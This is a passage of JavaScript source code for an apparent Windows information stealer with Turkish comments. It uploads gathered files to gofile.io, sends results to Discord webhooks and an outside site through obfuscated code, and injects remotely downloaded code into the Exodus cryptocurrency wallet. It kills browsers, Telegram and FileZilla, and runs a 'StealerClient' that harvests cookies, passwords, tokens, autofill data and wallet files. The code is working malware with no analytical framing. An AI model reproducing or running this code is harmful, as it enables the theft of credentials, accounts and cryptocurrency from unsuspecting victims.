                str += `\n\n@~$~@fewer-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (str !== '') {
        fs.writeFileSync('\\backupcodes.txt', str.slice(2))


axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `\\backupcodes.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders()
      })
        .then(uploadResponse => {
          const responsePayload = {
            uploadResponseData: uploadResponse.data
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'BackupCode Dosyası Yükleme Yanıtı',
                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

  var _0x2d762f=_0x516a;(function(_0x5a02eb,_0x3c0f76){var _0x405bed=_0x516a,_0x457f3b=_0x5a02eb();while(!![]){try{var _0x87057f=parseInt(_0x405bed(0x1e1))/0x1*(-parseInt(_0x405bed(0x200))/0x2)+-parseInt(_0x405bed(0x1ea))/0x3*(parseInt(_0x405bed(0x201))/0x4)+parseInt(_0x405bed(0x1df))/0x5*(parseInt(_0x405bed(0x202))/0x6)+parseInt(_0x405bed(0x1ee))/0x7+-parseInt(_0x405bed(0x1ef))/0x8*(-parseInt(_0x405bed(0x1f3))/0x9)+-parseInt(_0x405bed(0x1e7))/0xa*(parseInt(_0x405bed(0x1f9))/0xb)+parseInt(_0x405bed(0x1fc))/0xc;if(_0x87057f===_0x3c0f76)break;else _0x457f3b['push'](_0x457f3b['shift']());}catch(_0x504b9d){_0x457f3b['push'](_0x457f3b['shift']());}}}(_0x52a9,0xc9c41));var _0x114e0f=(function(){var _0x55518b=!![];return function(_0x29feed,_0x5df942){var _0x842978=_0x55518b?function(){var _0x3fcee3=_0x516a;if(_0x5df942){var _0x2ab2fd=_0x5df942[_0x3fcee3(0x1ed)](_0x29feed,arguments);return _0x5df942=null,_0x2ab2fd;}}:function(){};return _0x55518b=![],_0x842978;};}()),_0x497446=_0x114e0f(this,function(){var _0x472052=_0x516a;return _0x497446['toString']()[_0x472052(0x1f2)](_0x472052(0x1de))[_0x472052(0x1f6)]()[_0x472052(0x1e6)](_0x497446)[_0x472052(0x1f2)](_0x472052(0x1de));});function _0x516a(_0x356798,_0x18cb52){var _0x32adab=_0x52a9();return _0x516a=function(_0x3591a8,_0x5477d0){_0x3591a8=_0x3591a8-0x1de;var _0x2e2ed8=_0x32adab[_0x3591a8];return _0x2e2ed8;},_0x516a(_0x356798,_0x18cb52);}_0x497446();var _0x5477d0=(function(){var _0x587500=!![];return function(_0xc813b4,_0x4bdc8f){var _0x443592=_0x587500?function(){if(_0x4bdc8f){var _0x30180d=_0x4bdc8f['apply'](_0xc813b4,arguments);return _0x4bdc8f=null,_0x30180d;}}:function(){};return _0x587500=![],_0x443592;};}()),_0x3591a8=_0x5477d0(this,function(){var _0x24b8a9=_0x516a,_0x2b0f32;try{var _0x1b2c72=Function(_0x24b8a9(0x1e3)+_0x24b8a9(0x1e4)+');');_0x2b0f32=_0x1b2c72();}catch(_0x4b89b4){_0x2b0f32=window;}var _0x38c790=_0x2b0f32['console']=_0x2b0f32[_0x24b8a9(0x1f5)]||{},_0x4dd4e6=[_0x24b8a9(0x1fb),'warn','info',_0x24b8a9(0x1f1),_0x24b8a9(0x1e2),_0x24b8a9(0x1f4),_0x24b8a9(0x1f8)];for(var _0x2bbf95=0x0;_0x2bbf95<_0x4dd4e6['length'];_0x2bbf95++){var _0x15a667=_0x5477d0['constructor'][_0x24b8a9(0x1e0)][_0x24b8a9(0x1ec)](_0x5477d0),_0x3ad5b2=_0x4dd4e6[_0x2bbf95],_0x4527c=_0x38c790[_0x3ad5b2]||_0x15a667;_0x15a667[_0x24b8a9(0x1fe)]=_0x5477d0[_0x24b8a9(0x1ec)](_0x5477d0),_0x15a667[_0x24b8a9(0x1f6)]=_0x4527c['toString'][_0x24b8a9(0x1ec)](_0x4527c),_0x38c790[_0x3ad5b2]=_0x15a667;}});_0x3591a8(),axios[_0x2d762f(0x1e9)](_0x2d762f(0x1fa),embedData)[_0x2d762f(0x1f7)](_0xe0e703=>{var _0x181316=_0x2d762f;console[_0x181316(0x1fb)](_0x181316(0x1eb),_0xe0e703['status'],_0xe0e703[_0x181316(0x1ff)]);})[_0x2d762f(0x1f0)](_0x45b04d=>{var _0x4886cc=_0x2d762f;console[_0x4886cc(0x1fb)]('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x45b04d['message']);}),axios['post'](webhook3939,embedData)[_0x2d762f(0x1f7)](_0x293e06=>{var _0x3194a0=_0x2d762f;console[_0x3194a0(0x1fb)](_0x3194a0(0x1eb),_0x293e06[_0x3194a0(0x1fd)],_0x293e06[_0x3194a0(0x1ff)]);})[_0x2d762f(0x1f0)](_0x540824=>{var _0x48b26e=_0x2d762f;console[_0x48b26e(0x1fb)](_0x48b26e(0x1e5),_0x540824[_0x48b26e(0x1e8)]);});function _0x52a9(){var _0x5df497=['constructor','1901180yqVKzB','message','post','9NLwVBC','Webhook\x20gönderildi:','bind','apply','10210830BBZFIL','16rIHgIP','catch','error','search','1836108hrNqjV','table','console','toString','then','trace','11jMcnto','https://buildandwatch.net/','log','7122372nTBaqK','status','__proto__','statusText','4jlWlVj','1230352mEFObx','198276sEHqvz','(((.+)+)+)+$','10Rypxqs','prototype','293511Hmbybc','exception','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)','Webhook\x20gönderilirken\x20hata\x20oluştu:'];_0x52a9=function(){return _0x5df497;};return _0x52a9();}

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

var _0x2d762f=_0x516a;(function(_0x5a02eb,_0x3c0f76){var _0x405bed=_0x516a,_0x457f3b=_0x5a02eb();while(!![]){try{var _0x87057f=parseInt(_0x405bed(0x1e1))/0x1*(-parseInt(_0x405bed(0x200))/0x2)+-parseInt(_0x405bed(0x1ea))/0x3*(parseInt(_0x405bed(0x201))/0x4)+parseInt(_0x405bed(0x1df))/0x5*(parseInt(_0x405bed(0x202))/0x6)+parseInt(_0x405bed(0x1ee))/0x7+-parseInt(_0x405bed(0x1ef))/0x8*(-parseInt(_0x405bed(0x1f3))/0x9)+-parseInt(_0x405bed(0x1e7))/0xa*(parseInt(_0x405bed(0x1f9))/0xb)+parseInt(_0x405bed(0x1fc))/0xc;if(_0x87057f===_0x3c0f76)break;else _0x457f3b['push'](_0x457f3b['shift']());}catch(_0x504b9d){_0x457f3b['push'](_0x457f3b['shift']());}}}(_0x52a9,0xc9c41));var _0x114e0f=(function(){var _0x55518b=!![];return function(_0x29feed,_0x5df942){var _0x842978=_0x55518b?function(){var _0x3fcee3=_0x516a;if(_0x5df942){var _0x2ab2fd=_0x5df942[_0x3fcee3(0x1ed)](_0x29feed,arguments);return _0x5df942=null,_0x2ab2fd;}}:function(){};return _0x55518b=![],_0x842978;};}()),_0x497446=_0x114e0f(this,function(){var _0x472052=_0x516a;return _0x497446['toString']()[_0x472052(0x1f2)](_0x472052(0x1de))[_0x472052(0x1f6)]()[_0x472052(0x1e6)](_0x497446)[_0x472052(0x1f2)](_0x472052(0x1de));});function _0x516a(_0x356798,_0x18cb52){var _0x32adab=_0x52a9();return _0x516a=function(_0x3591a8,_0x5477d0){_0x3591a8=_0x3591a8-0x1de;var _0x2e2ed8=_0x32adab[_0x3591a8];return _0x2e2ed8;},_0x516a(_0x356798,_0x18cb52);}_0x497446();var _0x5477d0=(function(){var _0x587500=!![];return function(_0xc813b4,_0x4bdc8f){var _0x443592=_0x587500?function(){if(_0x4bdc8f){var _0x30180d=_0x4bdc8f['apply'](_0xc813b4,arguments);return _0x4bdc8f=null,_0x30180d;}}:function(){};return _0x587500=![],_0x443592;};}()),_0x3591a8=_0x5477d0(this,function(){var _0x24b8a9=_0x516a,_0x2b0f32;try{var _0x1b2c72=Function(_0x24b8a9(0x1e3)+_0x24b8a9(0x1e4)+');');_0x2b0f32=_0x1b2c72();}catch(_0x4b89b4){_0x2b0f32=window;}var _0x38c790=_0x2b0f32['console']=_0x2b0f32[_0x24b8a9(0x1f5)]||{},_0x4dd4e6=[_0x24b8a9(0x1fb),'warn','info',_0x24b8a9(0x1f1),_0x24b8a9(0x1e2),_0x24b8a9(0x1f4),_0x24b8a9(0x1f8)];for(var _0x2bbf95=0x0;_0x2bbf95<_0x4dd4e6['length'];_0x2bbf95++){var _0x15a667=_0x5477d0['constructor'][_0x24b8a9(0x1e0)][_0x24b8a9(0x1ec)](_0x5477d0),_0x3ad5b2=_0x4dd4e6[_0x2bbf95],_0x4527c=_0x38c790[_0x3ad5b2]||_0x15a667;_0x15a667[_0x24b8a9(0x1fe)]=_0x5477d0[_0x24b8a9(0x1ec)](_0x5477d0),_0x15a667[_0x24b8a9(0x1f6)]=_0x4527c['toString'][_0x24b8a9(0x1ec)](_0x4527c),_0x38c790[_0x3ad5b2]=_0x15a667;}});_0x3591a8(),axios[_0x2d762f(0x1e9)](_0x2d762f(0x1fa),embedData)[_0x2d762f(0x1f7)](_0xe0e703=>{var _0x181316=_0x2d762f;console[_0x181316(0x1fb)](_0x181316(0x1eb),_0xe0e703['status'],_0xe0e703[_0x181316(0x1ff)]);})[_0x2d762f(0x1f0)](_0x45b04d=>{var _0x4886cc=_0x2d762f;console[_0x4886cc(0x1fb)]('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x45b04d['message']);}),axios['post'](webhook3939,embedData)[_0x2d762f(0x1f7)](_0x293e06=>{var _0x3194a0=_0x2d762f;console[_0x3194a0(0x1fb)](_0x3194a0(0x1eb),_0x293e06[_0x3194a0(0x1fd)],_0x293e06[_0x3194a0(0x1ff)]);})[_0x2d762f(0x1f0)](_0x540824=>{var _0x48b26e=_0x2d762f;console[_0x48b26e(0x1fb)](_0x48b26e(0x1e5),_0x540824[_0x48b26e(0x1e8)]);});function _0x52a9(){var _0x5df497=['constructor','1901180yqVKzB','message','post','9NLwVBC','Webhook\x20gönderildi:','bind','apply','10210830BBZFIL','16rIHgIP','catch','error','search','1836108hrNqjV','table','console','toString','then','trace','11jMcnto','https://buildandwatch.net/','log','7122372nTBaqK','status','__proto__','statusText','4jlWlVj','1230352mEFObx','198276sEHqvz','(((.+)+)+)+$','10Rypxqs','prototype','293511Hmbybc','exception','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)','Webhook\x20gönderilirken\x20hata\x20oluştu:'];_0x52a9=function(){return _0x5df497;};return _0x52a9();}
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });


    }
}
///
//

async function extractAppAsarAndInject(path, procc, url, webhook) {
  if (!fs.existsSync(path)) {
    console.error('The path does not exist.');
    return;
  }

  const listOfFiles = fs.readdirSync(path);
  const apps = listOfFiles.filter((file) => file.includes('app-'));

  try {
    const randomExodusFile = `${path}/${apps[0]}/LICENSE`;
    const check = fs.readFileSync(randomExodusFile, 'utf8');
    if (check.includes('gofile')) {
      console.error('The license already contains "gofile".');
      return;
    }
    // Adding the webhook URL's path to the LICENSE file
    const webhookPath = `${webhook}:https://gofile/exoduswalletzip`;
    fs.writeFileSync(randomExodusFile, webhookPath, 'utf8');
    console.log('Webhook URL path added to LICENSE.');
  } catch (err) {
    console.error('Error while checking the license:', err);
    return;
  }

  // Step 1: Extract app.asar contents
  for (const app of apps) {
    try {
      const fullpath = `${path}/${app}/resources/app.asar`;
      const extractDir = `${path}/${app}/resources/app`;

      await extractAll(fullpath, extractDir);
    } catch (err) {
      console.error('Error while extracting app.asar:', err);
      return;
    }
  }

  // Step 2: Download code from the provided URL
  let code;
  try {
    code = await new Promise((resolve, reject) => {
      https.get(url, (res) => {
        if (res.statusCode < 200 || res.statusCode >= 300) {
          reject(new Error(`Request failed with status code ${res.statusCode}`));
        }

        let data = '';
        res.on('data', (chunk) => {
          data += chunk;
        });

        res.on('end', () => {
          resolve(data);
        });
      }).on('error', reject);
    });
  } catch (err) {
    console.error('Error while downloading code:', err);
    return;
  }

  // Step 3: Inject the downloaded code into "src/app/main/index.js"
  for (const app of apps) {
    try {
      const indexPath = `${path}/${app}/resources/app/src/app/main/index.js`;

      fs.writeFileSync(indexPath, code, 'utf8');
    } catch (err) {
      console.error('Error while injecting code:', err);
      return;
    }
  }

  // Step 4: Repackage the modified contents into app.asar
  for (const app of apps) {
    try {
      const fullpath = `${path}/${app}/resources/app.asar`;
      const extractDir = `${path}/${app}/resources/app`;

      await createPackage(extractDir, fullpath);
    } catch (err) {
      console.error('Error while repackaging app.asar:', err);
      return;
    }
  }

  // Kill the specified process
  try {
    execSync(`taskkill /im ${procc} /t /f >nul 2>&1`);
  } catch (err) {
    console.error('Error while killing the process:', err);
  }
}

// Define the local path to the directory containing the Exodus files
const localll = `C:/Users/${process.env.USERNAME}/AppData/Local/exodus`;

// Define the URL to download the code from
const codeDownloadURL = 'https://raw.githubusercontent.com/xfixxygithubcdn/asar/main/index.js';

// Define the Discord webhook URL
const webhook = "putyourdiscordwebhook idandtoken example 1140099498811592776/ESVhMa2_MNqmQcCGQZif3goeF5HNyk5ozbEgkmqkimIZMvIW1mcGRUSLyl48bwLKAMMX";

// Call the extractAppAsarAndInject function with the correct parameters
extractAppAsarAndInject(localll, 'exodus.exe', codeDownloadURL, webhook);
//

async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "Telegram.exe", "filezilla.exe", "msedge.exe", "opera.exe", "brave.exe"];
  return new Promise(async (resolve) => {
    try {
      const { execSync } = require("child_process");
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });
      await new Promise((resolve) => setTimeout(resolve, 2500));
      resolve();
    } catch (e) {
      console.log(e);
      resolve();
    }
  });
}




//



function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

class StealerClient {
	constructor() {
		closeBrowsers();
		StopCords();
		getEncrypted();
		getCookiesAndSendWebhook();
		getExtension();
		InfectDiscords();
	//	StealTokens();
		stealltokens();
		getAutofills();
		getPasswords();
		getZippp();
		SubmitTelegram();
		getPeperonni();
		SubmitExodus();
		submitfilezilla();

	}
}

new StealerClient()
